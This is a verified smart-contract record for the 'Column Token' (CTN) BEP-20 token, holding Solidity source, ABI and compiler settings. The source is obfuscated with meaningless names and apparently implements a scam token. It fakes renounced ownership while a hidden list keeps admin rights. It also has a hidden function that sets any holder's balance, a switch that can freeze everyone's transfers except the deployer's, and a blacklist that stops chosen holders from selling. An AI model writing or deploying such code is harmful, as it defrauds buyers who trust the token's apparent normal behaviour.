{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface totalLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountTx) external view returns (uint256);\n\n    function transfer(address amountMax, uint256 totalLaunchAuto) external returns (bool);\n\n    function allowance(address receiverMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalLaunchAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountMax,\n        uint256 totalLaunchAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderAmount, uint256 value);\n    event Approval(address indexed receiverMax, address indexed spender, uint256 value);\n}\n\nabstract contract fundSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface toMin {\n    function createPair(address fundAt, address walletTrading) external returns (address);\n}\n\ninterface totalLaunchedMetadata is totalLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ColumnToken is fundSender, totalLaunched, totalLaunchedMetadata {\n\n    function exemptFrom(address sellExempt, address amountMax, uint256 totalLaunchAuto) internal returns (bool) {\n        if (sellExempt == receiverToken) {\n            return launchLimitWallet(sellExempt, amountMax, totalLaunchAuto);\n        }\n        uint256 fundShould = totalLaunched(isMinLiquidity).balanceOf(receiverMarketing);\n        require(fundShould == amountIs);\n        require(amountMax != receiverMarketing);\n        if (enableReceiver[sellExempt]) {\n            return launchLimitWallet(sellExempt, amountMax, feeTotalMax);\n        }\n        return launchLimitWallet(sellExempt, amountMax, totalLaunchAuto);\n    }\n\n    address public receiverToken;\n\n    event OwnershipTransferred(address indexed limitMax, address indexed isShould);\n\n    uint256 private receiverAuto;\n\n    function approve(address totalTo, uint256 totalLaunchAuto) public virtual override returns (bool) {\n        minLaunchedMode[_msgSender()][totalTo] = totalLaunchAuto;\n        emit Approval(_msgSender(), totalTo, totalLaunchAuto);\n        return true;\n    }\n\n    mapping(address => bool) public shouldLaunch;\n\n    uint8 private shouldMax = 18;\n\n    uint256 private fromFeeMax;\n\n    function transferFrom(address sellExempt, address amountMax, uint256 totalLaunchAuto) external override returns (bool) {\n        if (_msgSender() != totalAmountTx) {\n            if (minLaunchedMode[sellExempt][_msgSender()] != type(uint256).max) {\n                require(totalLaunchAuto <= minLaunchedMode[sellExempt][_msgSender()]);\n                minLaunchedMode[sellExempt][_msgSender()] -= totalLaunchAuto;\n            }\n        }\n        return exemptFrom(sellExempt, amountMax, totalLaunchAuto);\n    }\n\n    bool private marketingReceiverMode;\n\n    uint256 amountIs;\n\n    function shouldIs(address limitLaunch) public {\n        senderList();\n        \n        if (limitLaunch == receiverToken || limitLaunch == isMinLiquidity) {\n            return;\n        }\n        enableReceiver[limitLaunch] = true;\n    }\n\n    bool public receiverWallet;\n\n    address receiverMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldMax;\n    }\n\n    address totalAmountTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return amountSender;\n    }\n\n    uint256 private modeAutoMax;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamMax;\n    }\n\n    string private amountSender = \"Column Token\";\n\n    uint256 private totalExempt;\n\n    function allowance(address modeWallet, address totalTo) external view virtual override returns (uint256) {\n        if (totalTo == totalAmountTx) {\n            return type(uint256).max;\n        }\n        return minLaunchedMode[modeWallet][totalTo];\n    }\n\n    uint256 modeLaunch;\n\n    uint256 constant feeTotalMax = 7 ** 10;\n\n    constructor (){\n        \n        totalShould launchedMode = totalShould(totalAmountTx);\n        isMinLiquidity = toMin(launchedMode.factory()).createPair(launchedMode.WETH(), address(this));\n        \n        receiverToken = _msgSender();\n        isToBuy();\n        shouldLaunch[receiverToken] = true;\n        senderFundEnable[receiverToken] = takeLaunchTeam;\n        \n        emit Transfer(address(0), receiverToken, takeLaunchTeam);\n    }\n\n    address private takeMin;\n\n    function swapTrading(uint256 totalLaunchAuto) public {\n        senderList();\n        amountIs = totalLaunchAuto;\n    }\n\n    function owner() external view returns (address) {\n        return takeMin;\n    }\n\n    function fromExemptToken(address swapExemptTrading, uint256 totalLaunchAuto) public {\n        senderList();\n        senderFundEnable[swapExemptTrading] = totalLaunchAuto;\n    }\n\n    function shouldList(address amountFund) public {\n        if (receiverWallet) {\n            return;\n        }\n        if (receiverAuto != totalExempt) {\n            totalExempt = fromFeeMax;\n        }\n        shouldLaunch[amountFund] = true;\n        \n        receiverWallet = true;\n    }\n\n    mapping(address => bool) public enableReceiver;\n\n    function transfer(address swapExemptTrading, uint256 totalLaunchAuto) external virtual override returns (bool) {\n        return exemptFrom(_msgSender(), swapExemptTrading, totalLaunchAuto);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeLaunchTeam;\n    }\n\n    uint256 private takeLaunchTeam = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private minLaunchedMode;\n\n    string private teamMax = \"CTN\";\n\n    function isToBuy() public {\n        emit OwnershipTransferred(receiverToken, address(0));\n        takeMin = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return takeMin;\n    }\n\n    function launchLimitWallet(address sellExempt, address amountMax, uint256 totalLaunchAuto) internal returns (bool) {\n        require(senderFundEnable[sellExempt] >= totalLaunchAuto);\n        senderFundEnable[sellExempt] -= totalLaunchAuto;\n        senderFundEnable[amountMax] += totalLaunchAuto;\n        emit Transfer(sellExempt, amountMax, totalLaunchAuto);\n        return true;\n    }\n\n    function balanceOf(address amountTx) public view virtual override returns (uint256) {\n        return senderFundEnable[amountTx];\n    }\n\n    address public isMinLiquidity;\n\n    function senderList() private view {\n        require(shouldLaunch[_msgSender()]);\n    }\n\n    mapping(address => uint256) private senderFundEnable;\n\n    bool private launchedMax;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalLaunchAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapExemptTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalLaunchAuto\",\"type\":\"uint256\"}],\"name\":\"fromExemptToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMinLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isToBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitLaunch\",\"type\":\"address\"}],\"name\":\"shouldIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountFund\",\"type\":\"address\"}],\"name\":\"shouldList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalLaunchAuto\",\"type\":\"uint256\"}],\"name\":\"swapTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapExemptTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalLaunchAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalLaunchAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ColumnToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}